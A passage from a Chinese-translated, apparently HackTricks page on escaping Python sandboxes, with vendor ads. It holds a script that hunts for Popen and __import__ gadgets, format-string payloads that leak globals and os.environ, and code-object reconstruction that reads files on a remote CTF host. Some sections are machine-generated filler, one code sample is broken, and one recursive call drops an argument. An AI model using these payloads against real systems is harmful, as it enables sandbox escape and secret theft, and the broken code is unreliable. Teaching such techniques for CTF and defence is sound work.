"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
您可以在此页面上检查此脚本的输出：

{% content-ref url="broken-reference" %}
[损坏的链接](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

查找最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Python格式化字符串

如果您向Python发送一个将要进行格式化的字符串，您可以使用`{}`来访问Python的内部信息。您可以使用前面的示例来访问全局变量或内置变量。

{% hint style="info" %}
然而，有一个**限制**，您只能使用符号`.[]`，因此您**无法执行任意代码**，只能读取信息。\
_**如果您知道如何通过此漏洞执行代码，请与我联系。**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
请注意，您可以使用**点**（如`people_obj.__init__`）以正常方式访问属性，也可以使用**括号**（不带引号）访问**字典元素**，例如`__globals__[CONFIG]`。

另请注意，您可以使用`.__dict__`来枚举对象的元素，例如`get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`。

格式字符串的一些其他有趣特性是通过添加**`!s`**、**`!r`**、**`!a`**来在指定对象中执行**`str`**、**`repr`**和**`ascii`**函数，分别表示字符串、表示和ASCII格式。
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
此外，还可以在类中编写新的格式化程序：
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**更多示例**关于**格式化字符串**的例子可以在[**https://pyformat.info/**](https://pyformat.info)找到。

{% hint style="danger" %}
还要查看以下页面，其中包含从Python内部对象中**读取敏感信息**的工具：
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### 敏感信息泄露的有效载荷
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## 解析Python对象

{% hint style="info" %}
如果你想深入了解**Python字节码**，请阅读这篇关于该主题的**精彩**文章：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

在一些CTF中，你可能会得到一个**自定义函数的名称**，其中包含了标志，并且你需要查看函数的**内部**以提取它。

这是要检查的函数：
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### 目录
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### 全局变量

`__globals__` 和 `func_globals`（相同）获取全局环境。在示例中，您可以看到一些导入的模块，一些全局变量及其声明的内容：
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**在这里查看更多获取全局变量的方法**](./#globals-and-locals)

### **访问函数代码**

**`__code__`** 和 `func_code`: 你可以访问函数的这个属性来获取函数的代码对象。
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### 获取代码信息

To bypass Python sandboxes, it is crucial to gather as much information about the code being executed as possible. This information can help identify potential vulnerabilities and weaknesses in the sandbox environment. Here are some techniques to gather code information:

#### 1. Inspecting the Code

One of the simplest ways to gather code information is by inspecting the source code itself. This can be done by reading the code directly or using tools like static code analyzers. By analyzing the code, you can identify any potential security flaws or vulnerabilities that can be exploited.

#### 2. Dynamic Analysis

Dynamic analysis involves running the code in a controlled environment and monitoring its behavior. This can be done using tools like debuggers or dynamic analysis frameworks. By observing the code's execution, you can gather information about its runtime behavior, such as the functions being called, the data being processed, and any external dependencies.

#### 3. Reverse Engineering

Reverse engineering can be used to extract information from compiled or obfuscated code. This involves decompiling the code or analyzing its binary representation to understand its functionality. Reverse engineering can help uncover hidden features, identify potential vulnerabilities, or reveal any malicious behavior.

#### 4. Code Review

Code review involves manually examining the code for security vulnerabilities. This can be done by experienced developers or security experts who are familiar with common coding mistakes and best practices. Code review can help identify potential security flaws, such as input validation issues, insecure coding patterns, or improper use of libraries.

#### 5. Fuzzing

Fuzzing is a technique used to test the code's resilience against unexpected inputs. By providing random or malformed inputs to the code, you can identify potential crashes, memory leaks, or other vulnerabilities. Fuzzing can be automated using tools or performed manually.

By gathering code information through these techniques, you can gain a better understanding of the code's behavior and identify potential weaknesses in the sandbox environment. This information can be used to develop effective bypass techniques and enhance the overall security of the system.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **反汇编函数**

To bypass Python sandboxes, it is often necessary to understand how the sandboxing mechanisms work. One way to do this is by disassembling the target function to analyze its bytecode instructions.

为了绕过Python沙盒，通常需要了解沙盒机制的工作原理。一种方法是通过反汇编目标函数来分析其字节码指令。

Disassembling a function allows us to see the low-level instructions that make up the function's logic. By examining these instructions, we can identify any security checks or restrictions imposed by the sandbox.

反汇编函数可以让我们看到构成函数逻辑的低级指令。通过检查这些指令，我们可以识别沙盒所施加的任何安全检查或限制。

To disassemble a function in Python, we can use the `dis` module. This module provides a `dis` function that takes a function object as an argument and prints the disassembled bytecode instructions.

要在Python中反汇编函数，我们可以使用`dis`模块。该模块提供了一个`dis`函数，它以函数对象作为参数，并打印反汇编的字节码指令。

Here is an example of how to disassemble a function named `target_function`:

以下是如何反汇编名为`target_function`的函数的示例：

```python
import dis

def target_function():
    # Function logic here

dis.dis(target_function)
```

The output will display the bytecode instructions of the `target_function`, allowing us to analyze its behavior and identify any potential vulnerabilities or bypass techniques.

输出将显示`target_function`的字节码指令，使我们能够分析其行为并识别任何潜在的漏洞或绕过技术。
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
请注意，如果在Python沙箱中无法导入`dis`模块，您可以获取函数的**字节码**（`get_flag.func_code.co_code`），并在本地进行**反汇编**。您将无法看到被加载的变量的内容（`LOAD_CONST`），但可以从`get_flag.func_code.co_consts`中猜测它们，因为`LOAD_CONST`还会告诉您被加载的变量的偏移量。
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## 编译Python

现在，让我们假设你可以以某种方式**转储无法执行但你需要执行的函数的信息**。\
就像下面的例子中，你**可以访问该函数的代码对象**，但仅仅通过阅读反汇编，你**不知道如何计算标志**（_想象一个更复杂的`calc_flag`函数_）
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### 创建代码对象

首先，我们需要知道**如何创建和执行代码对象**，这样我们就可以创建一个来执行我们的泄漏函数：
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
根据Python版本，`code_type`的**参数**可能有**不同的顺序**。了解你正在运行的Python版本中参数的顺序的最佳方法是运行以下命令：
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
### 重新创建一个泄漏的函数

{% hint style="warning" %}
在下面的示例中，我们将直接从函数代码对象中获取重建函数所需的所有数据。在一个**真实的示例**中，执行函数所需的所有**值**是**你需要泄漏的**。
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### 绕过防御措施

在本文开头的示例中，您可以看到如何使用`compile`函数执行任何Python代码。这很有趣，因为您可以使用一行代码执行整个脚本（我们也可以使用`exec`来做同样的事情）。\
无论如何，有时候在本地机器上创建一个编译对象并在CTF机器上执行它可能是有用的（例如，因为我们在CTF中没有`compile`函数）。

例如，让我们手动编译并执行一个读取`./poc.py`文件的函数：
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
如果您无法访问`eval`或`exec`，您可以创建一个**适当的函数**，但是直接调用它通常会失败，显示"在受限模式下无法访问构造函数"。因此，您需要一个**不在受限环境中的函数来调用此函数**。
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## 反编译已编译的Python代码

使用类似[**https://www.decompiler.com/**](https://www.decompiler.com)的工具，可以对给定的已编译Python代码进行反编译。

**查看本教程**：

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## 杂项Python

### 断言

使用参数`-O`执行的Python将删除断言语句和任何基于**debug**值的条件代码。\
因此，像以下这样的检查语句将被移除：
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
将被绕过

## 参考资料

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
